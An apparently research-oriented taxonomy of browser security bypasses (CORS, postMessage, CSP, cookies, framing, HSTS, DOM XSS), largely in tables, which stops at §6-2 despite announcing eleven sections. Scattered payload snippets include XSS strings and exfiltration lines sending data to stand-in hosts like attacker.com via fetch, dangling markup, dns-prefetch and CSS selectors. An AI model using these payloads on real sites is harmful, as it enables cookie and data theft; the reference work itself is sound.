# Browser Security Model Bypass Mutation/Variation Taxonomy

---

## Classification Structure

Browser Security Model Bypass encompasses techniques that circumvent the fundamental security boundaries enforced by modern web browsers. These boundaries—Same-Origin Policy, Content Security Policy, cookie isolation, frame protection, transport security, and authentication mechanisms—form the foundational trust model of web security. Bypassing any of these controls can lead to devastating consequences: cross-site scripting, authentication bypass, information leakage, and complete account takeover.

This taxonomy organizes browser security bypasses along three axes:

**Axis 1 (Primary): Security Mechanism Target** — The specific browser security control being circumvented. This structural dimension organizes the taxonomy into eleven major categories (§1-§11), each representing a distinct security boundary: Same-Origin Policy enforcement, Content Security Policy, cookie security controls, frame protection mechanisms, transport security, DOM isolation, cross-origin isolation, parser/encoding layers, cross-origin communication channels, authentication systems, and extension/component security.

**Axis 2 (Cross-cutting): Discrepancy Type** — The nature of the mismatch or bypass technique that enables circumvention. These represent the fundamental classes of security failures that recur across all browser security mechanisms:

| Discrepancy Type | Definition | Example Manifestation |
|-----------------|------------|----------------------|
| **Parser Differential** | Different components parse the same input differently | URL confusion between browser and backend; HTML parsing variations enabling mXSS |
| **Policy Misconfiguration** | Weak or incorrect security policy settings | Wildcard CORS allowing all origins; CSP allowing 'unsafe-inline' |
| **Validation Bypass** | Circumventing origin, domain, or input validation | Null origin CORS bypass; SameSite cookie refresh; domain prefix matching |
| **State Confusion** | Exploiting inconsistent state between components | TOCTOU in authentication; cache vs origin inconsistency |
| **Type Confusion** | Exploiting type/namespace mismatches | DOM clobbering via named elements; prototype pollution; namespace XSS |
| **Protocol Mismatch** | Differences between protocol versions/implementations | HTTP/2 authority vs browser origin; HTTP/3 connection contamination |
| **Injection** | Malicious content surviving sanitization | PostMessage injection without origin validation; dangling markup |
| **API Hijacking** | Intercepting or manipulating browser APIs | WebAuthn API hijack via XSS; Service Worker registration takeover |
| **Downgrade Attack** | Forcing use of weaker security mechanisms | SSL stripping bypassing HSTS; WebAuthn fallback to SMS OTP |
| **Timing/Synchronization** | Exploiting timing windows or race conditions | Cookie refresh before CSRF check; redirect timing manipulation |

**Axis 3 (Mapping): Attack Scenario** — The real-world exploitation context where these bypasses are weaponized. Each technique maps to one or more attack scenarios: Cross-Site Scripting (XSS), information leakage, authentication bypass, privilege escalation, denial of service, cache poisoning, CSRF, account takeover, man-in-the-middle attacks, or supply chain compromise.

### Fundamental Mechanism

The browser security model is built on **trust boundaries** established through origins (scheme + host + port), security policies (CSP, CORS, cookie attributes), and isolation primitives (process isolation, sandboxing). Bypasses occur when:

1. **Differential Interpretation**: Multiple components (parser, validator, renderer, network stack) interpret the same input differently
2. **Policy Gaps**: Security policies contain loopholes, wildcards, or unsafe fallbacks
3. **Architectural Assumptions**: Security mechanisms assume other components have already validated input
4. **Backward Compatibility**: Legacy features (JSONP, document.domain, mixed content) undermine modern security controls

---

## §1. Same-Origin Policy (SOP) Enforcement Bypasses

The Same-Origin Policy is the cornerstone of web security, restricting how documents or scripts from one origin can interact with resources from another origin. SOP bypasses enable attackers to read cross-origin data, perform unauthorized actions, or execute code in the context of a victim origin.

### §1-1. CORS Misconfiguration Exploits

Cross-Origin Resource Sharing (CORS) extends SOP by allowing controlled cross-origin access, but misconfigurations create severe vulnerabilities.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Wildcard + Credentials** | Origin: * combined with credentials: true allows any origin to read authenticated responses | Server reflects arbitrary origin while allowing credentials |
| **Null Origin Reflection** | Server reflects "null" origin, allowing iframe srcdoc or sandboxed contexts to access resources | Origin validation checks for specific string "null" instead of rejecting it |
| **Domain Prefix/Suffix Matching** | Weak regex validation (e.g., checking if origin contains "example.com") allows attacker-controlled domains | Attacker registers evil-example.com or example.com.attacker.com |
| **Pre-domain Wildcard** | Origins like https://*.example.com reflected when attacker uses https://attacker.example.com | Subdomain wildcard validation without proper TLD boundary checking |
| **HTTP Downgrade** | HTTPS origin accepts CORS from HTTP origin, allowing MITM injection | Mixed content policies not enforced for CORS preflight |
| **CORS Caching Bypass** | CORS preflight responses cached across IP changes (CVE-2025-8036 in Firefox 141) | Preflight cache doesn't invalidate on network change |

The null origin reflection technique is particularly dangerous because sandboxed iframes and data: URLs inherit null origin. An attacker can create `<iframe srcdoc="<script>fetch('https://victim.com/api', {credentials:'include'}).then(r=>r.text()).then(data=>exfil(data))</script>">` to bypass SOP if the server reflects the null origin.

### §1-2. PostMessage Vulnerabilities

PostMessage enables intentional cross-origin communication but becomes a bypass vector when origin validation is absent or flawed.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Missing Origin Validation** | Message event listener doesn't check event.origin, accepting messages from any origin | Listener directly uses event.data without validation |
| **Domain Prefix Matching** | Origin check uses indexOf() or startsWith() allowing attacker domains | `if(e.origin.indexOf('example.com')>=0)` matches attacker.example.com.evil |
| **Wildcard Origin Acceptance** | Listener accepts "*" origin or checks for generic patterns | Authentication tokens sent via postMessage with wildcard targetOrigin |
| **Null Origin Bypass** | Origin validation checks for specific origin but null origin opens window and inherits same origin | Srcdoc iframe postMessage to parent window bypasses origin check |
| **Confused Deputy via Identifier Replacement** | Attacker captures legitimate postMessage requests and replaces identifiers with base64-encoded malicious payloads (Microsoft Teams CVE-2024-49038) | Application trusts message format without validating source |
| **Frame Window Reference Manipulation** | Attacker obtains reference to victim window via window.open() and sends messages before navigation | Message arrives before page fully loads and establishes proper origin checks |

A significant vulnerability class involves applications that process postMessage data without origin validation. For example, Microsoft Copilot Studio (CVE-2024-49038, CVSS 9.3) allowed cross-tenant data exfiltration because postMessage handlers trusted any origin when processing authentication tokens.

### §1-3. Cross-Origin Resource Access

Direct cross-origin resource access bypassing SOP through protocol-level or browser-level mechanisms.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Cross-Origin Script Inclusion** | Script tags bypass SOP by design; attacker tricks victim site into including attacker-controlled script | Dynamic script generation based on user input or vulnerable JSONP endpoints |
| **JSONP Callback Injection** | JSONP endpoints with controllable callback parameter allow arbitrary JavaScript execution | Whitelisted domain hosts JSONP endpoint: /api?callback=attacker_function |
| **CSS Cross-Origin Leak** | CSS can load cross-origin resources and leak information through timing, error events, or computed styles | Font-face, @import, background-image leak authentication status |
| **WebSocket Cross-Origin** | WebSocket handshake doesn't enforce SOP; servers may not validate Origin header (CSWSH) | WebSocket connection from attacker.com to victim.com succeeds without CSRF token |
| **DNS Rebinding** | Attacker domain resolves to internal IP after victim loads page, bypassing same-origin check | Attacker controls DNS with low TTL, switching from external IP to 127.0.0.1 |
| **0.0.0.0 Day (Localhost Bypass)** | Browsers allowed web pages to make requests to `0.0.0.0`, which maps to localhost (`127.0.0.1`) on macOS and Linux. This bypassed all existing localhost protections — PNA (Private Network Access), Chrome's `localhost` blocking, and Firefox's CORS-RFC1918 — because `0.0.0.0` was not classified as a private/local address. Attacker pages could reach local development servers (Selenium WebDriver, Pytorch TorchServe, etc.) via `fetch('http://0.0.0.0:port/')` (Oligo Security, Aug 2024) | macOS or Linux host running local services; browser treats `0.0.0.0` as non-private address; 18-year-old bug across Chrome, Firefox, Safari |
| **Document.domain Mutation** | Legacy document.domain setter allows same-site but different-origin pages to access each other | Both pages set document.domain to common parent (both deprecated but still present) |
| **Navigation API History Leak** | Chrome's Navigation API (`navigation.entries()`) exposed cross-origin URL information through navigation history entries, leaking full URLs of previously visited cross-origin pages (CVE-2022-4908) | Chrome with Navigation API enabled; victim navigates to cross-origin pages before attacker reads entries |

---

## §2. Content Security Policy (CSP) Bypasses

Content Security Policy provides a defense-in-depth layer against XSS by restricting resource loading and script execution. CSP bypasses enable attackers to execute JavaScript despite policy restrictions.

### §2-1. JSONP Endpoint Exploitation

JSONP endpoints on whitelisted domains provide the most reliable CSP bypass vector.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Direct JSONP Callback** | Whitelisted domain hosts JSONP endpoint with controllable callback parameter | CSP allows script-src 'self' whitelisted.com; attacker loads <script src="//whitelisted.com/api?callback=alert(1)"> |
| **Open Redirect to JSONP** | Whitelisted domain has open redirect; attacker chains redirect to JSONP endpoint on same or different whitelisted domain | CSP blocks direct load but allows redirect chain ending in JSONP |
| **JSONP via Relative Path Overwrite (RPO)** | CSP allows specific path; attacker uses path traversal to reach JSONP endpoint | CSP: script-src 'self' whitelisted.com/scripts/react/; attacker uses ../api/jsonp |
| **User-Controlled JSONP Data** | JSONP endpoint reflects user input in response body, enabling gadget injection | /api/user?id=<script>alert(1)</script>&callback=process |
| **Third-Party Analytics Redirect Gadget** | Third-party analytics or observability platforms (e.g., New Relic) expose authenticated redirect endpoints that accept arbitrary destination URLs via query parameters. When the analytics domain is CSP-whitelisted for script loading, the redirect endpoint serves as a `script-src` bypass gadget — loading attacker-controlled scripts through the trusted domain | CSP whitelists analytics vendor domain; vendor exposes auth-token redirect or custom event endpoint accepting URL parameter (lab.ctbb.show, 2025) |
| **Same-Origin Method Execution (SOME)** | JSONP endpoint with an unrestricted callback parameter allows invoking arbitrary JavaScript methods in the page's global scope — the callback value is interpreted as a dotted method-call chain (e.g., `?callback=opener.document.body.innerHTML`), enabling DOM manipulation or data exfiltration through the trusted origin without injecting new script code | CSP whitelists the JSONP origin or allows `script-src 'self'`; callback parameter accepts dotted property paths without alphanumeric-only validation (Ben Hayak, 2015) |

Tools like CSP Evaluator and JSONPeek automate discovery of JSONP endpoints on whitelisted domains. Google, Yahoo, and many CDNs historically hosted exploitable JSONP endpoints.

### §2-2. Base64 and Data URI Injection

CSP data: scheme allowance enables inline script execution through encoding.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Base64 Data URI** | CSP allows data: in script-src; attacker encodes JavaScript as base64 data URI | <script src="data:text/javascript;base64,YWxlcnQoMSk="> executes despite CSP |
| **SVG Data URI with Script** | CSP allows data: in img-src or object-src; attacker embeds script in SVG data URI | <object data="data:image/svg+xml,<svg><script>alert(1)</script></svg>"> |
| **XSLT Data URI** | CSP allows data: in various contexts; attacker uses XSLT to transform XML into HTML with script | CVE-2025-8032 allowed XSLT documents to sidestep CSP restrictions in Firefox |
| **Blob URI Construction** | Application creates blob URLs from user input; CSP allows blob: scheme | JavaScript creates blob:// URL containing attacker payload |

### §2-3. Unsafe Directive Abuse

CSP policies containing 'unsafe-inline', 'unsafe-eval', or wildcards negate protection.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Unsafe-inline Exploitation** | CSP includes 'unsafe-inline' in script-src, allowing any inline script | All inline <script>, event handlers, javascript: URIs execute |
| **Unsafe-eval Gadgets** | CSP includes 'unsafe-eval'; attacker finds eval(), Function(), setTimeout(string) in application code | Popular libraries (jQuery, AngularJS, Lodash) contain eval sinks |
| **Wildcard Domain Matching** | CSP uses wildcard like script-src https://* allowing any HTTPS domain | Attacker hosts script on any HTTPS domain including attacker-controlled |
| **Self + User Content Subdomain** | CSP allows 'self' but site hosts user-generated content on same origin | User uploads .js file or uses JSONP on user-content subdomain |

### §2-4. DOM-Based CSP Bypasses

CSP can be bypassed through DOM manipulation that doesn't create new script execution contexts.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **DOM Clobbering for CSP** | Attacker clobbers DOM properties used in CSP script loading logic | Inject <a id=defaultConfig><a id=defaultConfig name=scriptSrc href="data:,alert(1)"> to override config object |
| **Dangling Markup Injection** | CSP blocks script but attacker uses unclosed tags to exfiltrate data | <img src='//attacker.com/?leak= leaves tag open, browser includes following content in URL |
| **AngularJS Template Injection** | AngularJS on whitelisted domain processes {{}} expressions as code | CSP allows angular CDN; attacker injects {{constructor.constructor('alert(1)')()}} |
| **Mutation XSS (mXSS)** | HTML sanitizer parses differently than browser; mutation during rendering creates script | DOMPurify allows <form><math><mtext><form><mglyph><svg><mtext><textarea><path id="</textarea><img src onerror=alert(1)>"> (CVE-2024-47875) |
| **Service Worker Script Registration** | Attacker registers service worker before CSP applies or in scope without CSP | SW script loads before CSP header; subsequent fetches intercepted |
| **Nonce Reuse via Disk Cache** | Browser disk cache stores full HTTP responses including CSP nonce values in `<script nonce="...">` tags. By forcing cache fallback (e.g., navigating to a cached page, `fetch` with `cache: 'force-cache'`, or exploiting browser heuristic caching), an attacker recovers a previously-issued nonce from the cached response and injects a script tag reusing that nonce — satisfying `script-src 'nonce-...'` policies without needing a fresh nonce from the server | CSP uses nonce-based policy; target page is cacheable (explicit `Cache-Control` or browser heuristic caching); attacker has HTML injection to insert `<script nonce="leaked">` (Jorian Woltjer, 2025) |
| **Resource Hint / Ping-Based Exfiltration** | When CSP blocks `script-src` and `connect-src`, alternative DOM APIs exfiltrate data without script execution: `<link rel=dns-prefetch href="//stolen-token.attacker.com">` encodes data in DNS subdomain labels; `<a ping="https://attacker.com/collect">` sends a POST beacon on click; `<link rel=preconnect>` triggers TCP/TLS handshake to an attacker endpoint — all bypassing `connect-src` and `default-src` restrictions. Combined with CSS attribute selectors (`input[value^="a"] { background: url(//a.attacker.com) }`) for character-by-character extraction, these primitives enable scriptless data exfiltration from CSP-hardened pages | CSP restricts `script-src` and `connect-src`; attacker has HTML/CSS injection capability; target browser supports `dns-prefetch`, `ping`, or `preconnect` resource hints (filedescriptor, 2017) |

### §2-5. Policy Injection and Manipulation

Attacking the CSP policy itself rather than bypassing it.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Header Injection for CSP Weakening** | Attacker injects additional CSP header; however, browsers enforce **all** CSP headers independently (intersection, not union), so an injected weaker policy cannot weaken an existing strict policy. The real risk is injecting `Content-Security-Policy-Report-Only` for exfiltration, or injecting the **first** CSP header when none exists. | CRLF injection in response headers; no existing CSP policy, or targeting report-only exfiltration |
| **Meta Tag CSP Override** | HTML meta CSP tag competes with HTTP header; browsers may apply both or prefer one | Attacker injects <meta http-equiv="Content-Security-Policy" content="script-src *"> |
| **CSP Reporting Endpoint Injection** | Attacker controls report-uri endpoint, receiving reports containing sensitive data | CSP report-uri points to attacker domain; violations leak page content |
| **Browser Extension CSP Modification** | Malicious extension modifies CSP headers via webRequest API (CVE-2025-9866 Chromium) | Extension has webRequestBlocking permission and weakens CSP |
| **Browser Engine CSP Implementation Bug** | Bugs in the browser engine's CSP implementation itself (WebKit/Safari, etc.) can nullify correctly-defined CSP policies. Examples include WebKit failing to enforce the CSP sandbox directive to block cross-origin iframe credential access, or `strict-dynamic` interpretation differences causing inline script execution only on specific engines. The attack vector is not the policy definition but the *engine's conformance level with the specification*. | Browser engine's CSP implementation deviates from the W3C specification; attacker can fingerprint the victim's browser engine |
| **CSP Inheritance Failure** | Browser fails to inherit parent CSP when child navigates to javascript:/data:/blob: URLs dynamically, or when child opens static files (.txt/.ico). Safari allowed eval() from about:blank child despite parent blocking unsafe-eval; Chromium failed on asynchronous javascript: navigation. Static file inheritance is a spec ambiguity (DiffCSP, NDSS 2023 — 6 bugs). | Dynamic iframe.src change; child window opening static files; Safari or Chromium |
| **CSP Hash Handling Bug** | Chromium allowed arbitrary inline scripts in javascript: navigation regardless of hash value in script-src-elem; WebKit used hash-source from script-src to override explicit script-src-elem/script-src-attr 'none' directives due to incorrect fallback logic (DiffCSP, NDSS 2023 — 3 bugs). | CSP uses hash-source with script-src-elem; Chromium or Safari |
| **CSP3 Directive Non-Support** | Browser claims CSP3 support but specific directives (script-src-elem, script-src-attr) are unimplemented. Firefox lacked support for ~3 years; operators specifying these directives find their CSP silently ineffective (DiffCSP, NDSS 2023). | script-src-elem or script-src-attr in CSP; Firefox (pre-July 2022) |
| **CSP Directive Fallback Failure** | Browser does not support nonce-source, hash-source, or strict-dynamic in default-src fallback. When script-src is absent, these values are silently ignored — e.g., hash-source presence should disable unsafe-inline, but browsers ignoring it in default-src continue honoring unsafe-inline (DiffCSP, NDSS 2023). Firefox lacked support 6+ years. | CSP relies on default-src without explicit script-src; Firefox or Safari |
| **Auto-Enabled CSP Directive Values** | Browser enables directive values by default that the spec requires explicit opt-in: Firefox auto-enabled unsafe-hashes (event handlers matching hash-source executed without unsafe-hashes keyword); Safari auto-enabled wildcard * in script-src-elem, making 'none' completely ineffective (DiffCSP, NDSS 2023). | CSP uses hash-source (Firefox) or script-src-elem (Safari) |
| **Conditional Auto-Enabling of unsafe-inline** | Safari auto-enabled unsafe-inline in script-src-elem/script-src-attr when hash-source or strict-dynamic was present — even with arbitrary non-matching hash values. Six distinct bugs creating cross-directive side effects (DiffCSP, NDSS 2023). | CSP contains hash-source or strict-dynamic in script-src-elem/attr; Safari |
| **1xx Status Code Security Header Bypass** | Chromium rendered response body from 1xx HTTP status codes normally while ignoring ALL response headers including CSP, HSTS, and X-Frame-Options. Any page served with 100/101/102 status was completely unprotected (DiffCSP, NDSS 2023; patched Chromium 100). | Web page served with 1xx status; Chromium pre-v100 |
| **Malformed CSP Directive Disabling** | Non-ASCII character in a CSP directive value causes Chromium/Safari to ignore the entire directive; Firefox only drops the invalid value. Attacker who can inject content into CSP disables entire resource protection with a single non-ASCII character (DiffCSP, NDSS 2023). | Attacker can partially inject into CSP; CSP contains attacker-influenceable values |
| **strict-dynamic Outgoing Request Leak** | Under strict-dynamic, browser correctly blocks execution of parser-inserted scripts but fails to block the outgoing HTTP request. Enables data exfiltration via URL parameters without script execution. Firefox leaks via script tags; Chromium leaks via document.write-created scripts (DiffCSP, NDSS 2023). | strict-dynamic with nonce; parser-inserted or dynamically-written script tags |
| **CSP Specification Ambiguities** | W3C CSP spec contains undefined behaviors causing cross-browser inconsistencies: (1) CSP inheritance for static files unaddressed; (2) non-ASCII handling — drop value vs. entire directive; (3) javascript: navigation hash scope — hash full URI or just code (DiffCSP, NDSS 2023). | Same CSP produces different enforcement across browsers |
| **Nested Frame CSP Inheritance Inconsistency** | In deeply nested iframe contexts (srcdoc-in-srcdoc, data:-in-data:), browsers disagree on whether to allow JS fetching from CSP-allowed URLs. CSP enforcement becomes unreliable through multiple layers of local scheme navigation (DiffCSP, NDSS 2023). | Nested iframes using srcdoc or data: URLs; JS fetching from allowed URLs |

---

## §3. Cookie Security Control Bypasses

Cookie security attributes (SameSite, Secure, HttpOnly, Domain, Path) provide isolation and protection. Bypasses enable CSRF, session hijacking, and authentication bypass.

### §3-1. SameSite Cookie Bypasses

SameSite attribute prevents cookies from being sent in cross-site requests, mitigating CSRF. Bypasses circumvent this protection.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Method Override Bypass** | Frameworks allow HTTP method override; attacker converts POST to GET via _method parameter | SameSite=Lax allows GET requests; server accepts GET /api/transfer?_method=POST |
| **Cookie Refresh Bypass** | OAuth flow resets session cookies even for authenticated users; attacker triggers OAuth, then immediate attack | Attacker loads victim's OAuth callback, waits 2 seconds, submits CSRF form |
| **Server Method Leniency** | Server accepts GET request for endpoints designed for POST, ignoring method restrictions | POST-only endpoint processes GET /api/delete?id=123 from cross-site request |
| **Android Intent Redirect Bypass** | Android WebView bug allows attacker to bypass SameSite via intent:// redirect scheme | Attacker redirects to intent:// URL that bypasses cookie restrictions (patched 2024) |
| **First-Party Cookie Leniency** | Browser treats certain navigations as first-party despite cross-site origin | Top-level navigation with Sec-Fetch-Site: cross-site but browser sends SameSite=Lax cookies |
| **Subdomain Cookie Confusion** | Cookie set on parent domain with SameSite=None accessible from subdomains | Attacker controls subdomain evil.example.com and accesses example.com cookies |

The cookie refresh bypass is particularly effective against OAuth2 implementations. If the authorization server issues new session cookies even when the user is already logged in, an attacker can trigger the OAuth flow from a cross-site context, wait for the cookies to refresh, then immediately submit a malicious request using the fresh cookies.

### §3-2. Domain and Path Attribute Bypasses

Cookie scoping via Domain and Path attributes can be circumvented.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Cookie Tossing / Injection** | Attacker on subdomain sets cookie for parent domain, overriding legitimate cookie | evil.example.com sets Domain=example.com cookie, shadowing example.com's cookie |
| **Path Traversal Cookie Access** | Cookies scoped to /admin accessible from /admin/../../public due to path normalization | Browser normalizes path before matching cookie scope |
| **Cookie Bomb DoS** | Attacker fills cookie jar with maximum-size cookies, causing DoS | Browser allows 4KB per cookie × 50 cookies = 200KB of cookies |
| **Subdomain Wildcard Exploitation** | Wildcard subdomain cookie matches unintended subdomains | Domain=.example.com cookie accessible from attacker-controlled user.example.com |

### §3-3. Secure and HttpOnly Bypasses

Secure flag forces HTTPS transmission; HttpOnly prevents JavaScript access. Bypasses enable downgrade attacks and script-based cookie theft.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Mixed Content Secure Cookie Leak** | HTTPS page loads HTTP resource; cookie sent over unencrypted connection despite Secure flag | Partial HSTS deployment or user overrides security warning |
| **HttpOnly Bypass via XSS Gadget** | HttpOnly prevents document.cookie access but doesn't stop network requests with cookies | XSS executes fetch('/api/endpoint',{credentials:'include'}) and exfiltrates response |
| **Browser Extension Cookie Access** | Extensions can access HttpOnly cookies via chrome.cookies API | Malicious extension with cookies permission reads all cookies |
| **DevTools Protocol Cookie Access** | Chrome DevTools Protocol allows cookie access bypassing HttpOnly | Malicious application uses CDP to enumerate cookies |

---

## §4. Frame Protection Mechanism Bypasses

Frame protection (X-Frame-Options, CSP frame-ancestors, sandbox attribute) prevents clickjacking and frame-based attacks. Bypasses enable UI redressing, frame injection, and sandbox escapes.

### §4-1. X-Frame-Options and CSP frame-ancestors Bypasses

These headers control whether a page can be framed, preventing clickjacking.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Double Framing X-FO: SAMEORIGIN** | X-Frame-Options: SAMEORIGIN prevents cross-origin framing but allows same-origin; attacker uses double iframe | `attacker.com` (top) frames `victim.com/page-A` (intermediary) which frames `victim.com/page-B` (target); legacy browsers only checked the immediate parent's origin, so page-B sees page-A as same-origin and allows framing despite the top-level being attacker.com |
| **Frame-Ancestors Null Origin** | CSP frame-ancestors validation doesn't properly reject null origin | Sandboxed iframe with null origin bypasses frame-ancestors check |
| **Clickjacking on XFO Error Page** | Firefox native error page when X-FO blocks framing can itself be clickjacked (CVE-2024-5691) | Attacker frames the error page and performs clickjacking on it |
| **Portal Element Frame Bypass** | The experimental `<portal>` element embeds cross-origin pages for seamless navigation transitions. Portals ignore `X-Frame-Options` because embedded content is treated as a top-level browsing context rather than a frame (confirmed by Bentkowski / Securitum, 2019; $10K bounty). CSP `frame-ancestors` also does not cover `<portal>` — the directive's scope is limited to `<frame>`, `<iframe>`, `<object>`, `<embed>` per spec, with no mention of portals. An attacker uses `<portal src="https://victim.com">` to embed protected pages; portal activation (user click) navigates the top-level context to the embedded page, enabling clickjacking disguised as interactions with the attacker's page | Target browser supports `<portal>` element (Chrome experimental); victim page relies on X-Frame-Options or frame-ancestors without additional defenses (Bentkowski / Securitum, 2019) |

### §4-2. Iframe Sandbox Escapes

The sandbox attribute restricts iframe capabilities, but misconfigurations and browser bugs enable escapes.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Allow-Scripts + Allow-Same-Origin** | Dangerous combination allows sandboxed script to remove sandbox attribute | Iframe with both flags can execute: parent.document.querySelector('iframe').removeAttribute('sandbox') |
| **Allow-Popups Inheritance** | Popups opened from sandboxed iframe inherit restrictions unless allow-popups-to-escape-sandbox set | Attacker opens popup via window.open(); popup has normal privileges if escape flag missing |
| **Target="_blank" JavaScript URI** | Sandbox blocks inline scripts but target="_blank" with javascript: URI may bypass | <a href="javascript:alert(top.document.domain)" target="_blank"> executes in opener context |
| **Window.opener Exploitation** | Sandboxed frame opens popup; popup's window.opener references parent despite sandbox | Popup can manipulate parent window location: window.opener.location='//attacker.com' |
| **History Navigation Sandbox Bypass** | Navigating back to a non-sandboxed page clears sandbox restrictions | Iframe loads sandboxed page, navigates to normal page, then history.back() removes sandbox |
| **Blob URL Sandbox Escape** | Blob URLs created in sandboxed context may not inherit all restrictions | Sandboxed iframe creates blob: URL with script; loading it bypasses sandbox |

A notable 2024 CTF challenge demonstrated chaining Base64-encoded HTML in a sandboxed iframe with allow-scripts and allow-modals. The attacker created a popup that inherited restrictions but could manipulate the opener's location, achieving full sandbox escape.

### §4-3. Clickjacking Variants

Advanced clickjacking techniques beyond simple iframe overlay.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Cursorjacking** | Attacker replaces cursor image with fake cursor offset from real position | User thinks they're clicking safe element but actually clicking hidden frame |
| **Drag-and-Drop Clickjacking** | Attacker uses drag-and-drop events to exfiltrate data or trigger actions | Dragging sensitive text to attacker-controlled drop zone |
| **Touch Event Clickjacking** | Mobile touch events manipulated to trigger unintended actions | Touch event listener on overlay redirects event to hidden frame |
| **Multiple Frame Clickjacking** | Attacker uses multiple stacked iframes to bypass protections | Top frame from attacker.com, middle frame from legitimate.com, bottom frame from victim.com |
| **Address Bar Spoofing via Intent/Fullscreen** | Combining intent:// URI schemes or fullscreen API abuse to overlay a fake address bar while navigating the browser to an attacker-controlled page. The user sees a trusted URL in the spoofed address bar while interacting with a malicious page (e.g., Opera browser intent URL handling) | Browser with insufficient intent:// or fullscreen UI validation; mobile browsers particularly susceptible |

---

## §5. Transport Security Bypasses

Transport security mechanisms (HSTS, certificate validation, mixed content protection) ensure encrypted communications. Bypasses enable man-in-the-middle attacks and eavesdropping.

### §5-1. HSTS (HTTP Strict Transport Security) Bypasses

HSTS forces browsers to use HTTPS for specified domains, preventing downgrade attacks.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **First-Visit HSTS Bypass** | HSTS only applies after first visit; attacker intercepts initial HTTP request | User types "bank.com" in address bar (no https://); browser sends HTTP request before HSTS established |
| **NTP Time Manipulation** | Attacker manipulates NTP to set system time past HSTS max-age expiration | HSTS policy expires; subsequent HTTP requests allowed |
| **SSLStrip+ Domain Substitution** | SSLStrip2/sslstrip+ rewrites HTTPS links to HTTP with similar-looking domain not in HSTS preload | https://bank.com → http://bank-secure.com; user doesn't notice domain change |
| **Subdomain HSTS Bypass** | HSTS set on main domain without includeSubDomains; attacker uses HTTP on subdomain | HSTS: max-age=31536000 (no includeSubDomains); attacker uses http://subdomain.bank.com |
| **Homograph Domain HSTS** | Attacker registers IDN homograph domain visually identical to target; no HSTS on homograph | User sees bаnk.com (Cyrillic 'а') instead of bank.com (Latin 'a'); no HSTS protection |

HSTS preload lists partially mitigate these attacks by hardcoding HSTS for major domains in browsers. However, preload lists only cover a small fraction of domains, and many organizations don't submit to the preload list due to the difficulty of removal.

### §5-2. Certificate Validation Bypasses

Certificate validation ensures the remote server is authentic. Bypasses enable MITM attacks.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **User Certificate Override** | Browser allows users to manually accept invalid certificates | User clicks "Proceed Anyway" on certificate warning; attacker's cert accepted |
| **Certificate Pinning Bypass** | Mobile app or browser extension bypasses certificate pinning validation | Malicious proxy uses frameworks like Frida or Xposed to disable pinning |
| **Certificate Chain Manipulation** | Attacker uses certificate from trusted CA for wrong domain; browser validates chain but not domain | Certificate for attacker.com signed by legitimate CA presented for victim.com |
| **Wildcard Certificate Abuse** | Wildcard cert *.example.com obtained for one subdomain used for another | Compromised bad.example.com uses *.example.com cert to MITM secure.example.com |

### §5-3. Mixed Content Exploitation

Mixed content occurs when HTTPS pages load HTTP resources. Bypasses allow injection of malicious content into secure pages.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Passive Mixed Content** | HTTPS page loads HTTP image/media; attacker replaces content via MITM | <img src="http://cdn.example.com/logo.png"> served over HTTP |
| **Active Mixed Content Upgrade Failure** | Browser should block HTTP scripts/stylesheets on HTTPS page but fails | Browser bug or misconfiguration allows <script src="http://evil.com/xss.js"> |
| **Form Action HTTP Submission** | HTTPS page submits form over HTTP, leaking sensitive data | <form action="http://receiver.com/login" method="POST"> on HTTPS page |
| **WebSocket Mixed Content** | HTTPS page establishes ws:// (unencrypted) WebSocket connection | new WebSocket('ws://victim.com/socket') from HTTPS page |

---

## §6. DOM Isolation Bypasses

DOM isolation mechanisms prevent malicious scripts from accessing or manipulating sensitive DOM properties. Bypasses include DOM XSS, DOM clobbering, mutation XSS, prototype pollution, and Trusted Types bypasses.

### §6-1. DOM XSS Sinks

DOM-based XSS occurs when client-side JavaScript writes attacker-controlled data into dangerous sinks.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **innerHTML Sink** | Attacker data written to element.innerHTML triggers inline event handlers on injected elements (innerHTML never executes `<script>` elements per the HTML spec's "already started" flag) | innerHTML with `<img src=x onerror=alert(1)>` or `<svg onload=alert(1)>` |
| **document.write() Sink** | document.write() with attacker data injects arbitrary HTML including script | document.write('<script>'+location.hash.substr(1)+'</script>') |
| **eval() / Function() Sink** | Attacker data passed to eval() or Function() constructor executes as JavaScript | eval('var x = ' + location.search.substr(1)); // ?x=alert(1) |
| **setTimeout/setInterval String Sink** | setTimeout/setInterval with string argument (not function) evaluates as JavaScript | setTimeout(location.hash.substr(1), 1000); // #alert(1) |
| **location Assignment Sink** | Assigning attacker data to location properties enables JavaScript execution | location.href = 'javascript:' + attackerData |
| **document.domain Sink** | Setting document.domain with attacker data can downgrade origin | document.domain = attackerInput; // downgrade to parent domain |
| **WebSocket URL Sink** | Attacker-controlled WebSocket URL can leak data or establish malicious connection | new WebSocket(attackerInput) |

Modern applications increasingly use frameworks that auto-escape output, but DOM XSS persists because frameworks can't protect against client-side sinks in custom JavaScript.

### §6-2. DOM Clobbering

DOM clobbering exploits HTML's ability to create named properties on the global object and DOM elements, overriding JavaScript variables.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **ID/Name Attribute Clobbering** | HTML elements with id or name attributes create global variables | <a id="config"><a id="config" name="apiUrl" href="//attacker.com"> clobbers window.config.apiUrl |
| **Form Input Clobbering** | Form elements with name attributes accessible via form.name syntax | <form id="x"><input name="action" value="//attacker.com"> clobbers x.action |
